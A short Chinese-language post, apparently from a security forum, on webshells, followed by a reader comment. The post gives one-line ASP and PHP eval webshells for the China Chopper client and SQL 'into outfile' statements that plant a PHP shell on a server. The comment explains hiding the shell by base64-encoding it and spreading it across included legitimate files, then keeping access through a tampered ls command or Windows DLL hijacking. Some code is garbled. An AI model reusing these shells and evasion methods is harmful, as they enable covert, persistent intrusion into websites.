[一文详解wenshell](https://www.freebuf.com/articles/web/235651.html#comment-283833)

## webshell 

一句话木马配上中国菜刀 
文件名字为 xxx .asp  如ma.asp 



```php
asp <%excute(request("value"))%> 

​       <%eval request("pass")%> 

PHP <?php @eval<$_post['pass'] >?> 
```

 用URL地址在中国菜刀使用进行关键查找，下载，上传，拖库等操作 

 

 

sql语句执行写入webshell 

```sql
select "test1 " into outfile "D:/Apperve/tset1.txt" 

select *from hacer union select 1,2,3 into outfile "D://Appserve/test2.txt" 
```

/*将联合查询的所有内容输入到test2.txt中*/ 

```sql
select *from hacer union select 1,<?php @eval($_post['pass']);?>,3 into outfile "D://Appserve/test3.php"   //利用此漏洞上传写入php文件 
```

 使用限制 

1. 需要mssq 或者 mysql 
2. 需要管理员权限 
3.  需要知道物理路径









### webshell文章与大神操作

你这些都太低级了
看看我的 就用这个来举例 <?php @eval($_POST[cmd])?>
@eval($_POST[cmd])只需要这句就直接嵌入正常文件就能使用。然后在变形。
删除evel 修改
id=$_POST[id]
如id=xxxx
id=evel
p=@id(base64_decode($_POST[cmd]))
p=base64_encode(p)
id可以使用正常文件的提交但是要提交一个判断这样在怎么查都查不到。在编码一下输出编码输入编码
在复杂点编码可以自定义。在把密匙放在post包中。把各行代码放在不通的文件中include之。。最好是原生文件
这样一行代码放一个文件 然后在首页inlcude然后提交 就OK除非完整去读代码或者整体换不然都很难发现。
还有保险。防止把整个系统完整删除。在权限足够的情况下做个定期写入的door linux下就是在ls命令下加点代码。win就简单了做个dll劫持就好。
就是一个写文件。加入白名单就安全了。。然后各种骚了。。一般只要网站不换。几乎是永久。

[一文详解wenshell](https://www.freebuf.com/articles/web/235651.html#comment-283833)